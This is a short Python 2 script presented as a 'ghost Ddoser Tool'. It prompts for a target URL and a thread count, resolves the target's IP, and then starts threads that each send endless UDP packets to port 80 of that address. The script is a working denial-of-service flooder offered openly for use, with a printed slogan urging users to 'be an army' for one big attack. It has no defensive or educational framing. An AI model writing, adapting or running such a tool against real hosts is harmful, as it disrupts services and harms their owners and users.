#!/usr/bin/python
import time, socket, sys, thread

def clear_all():
    """Clears all the variables from the workspace of the spyder application."""
    gl = globals().copy()
    for var in gl:
        if var[0] == '_': continue
        if 'func' in str(globals()[var]): continue
        if 'module' in str(globals()[var]): continue

        del globals()[var]
if __name__ == "__main__":
    clear_all()
                                                                       
print"\033[91m \033[1m ghost Ddoser Tool By\033[93m RiTaX"

victim_addr = raw_input("\033[96m Enter The URL [ENTER]: ")
thread_count = input("\033[96m Enter the counts of thread you wish to lunch [ENTER]: ")
victim_ip = socket.gethostbyname(victim_addr)

UDP_PORT = 80
MESSAGE = "DOS ATTACK!!!"
print "\033[93m UDP target \033[1m IP:", victim_ip
print "\033[93m UDP target \033[1m port:", UDP_PORT
time.sleep(3)

def dos(i):
	while True:	
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			sock.sendto(MESSAGE, (victim_ip, UDP_PORT))
			print '\033[91m Dos Attack to your \033[93m target \033[91mBe an army to make one big attack\n'
		
for i in xrange(thread_count):
	try:
	 thread.start_new_thread( dos , ("Thread-"+str(i),) )
	except KeyboardInterrupt:
			sys.exit(0)
while 1:
  pass
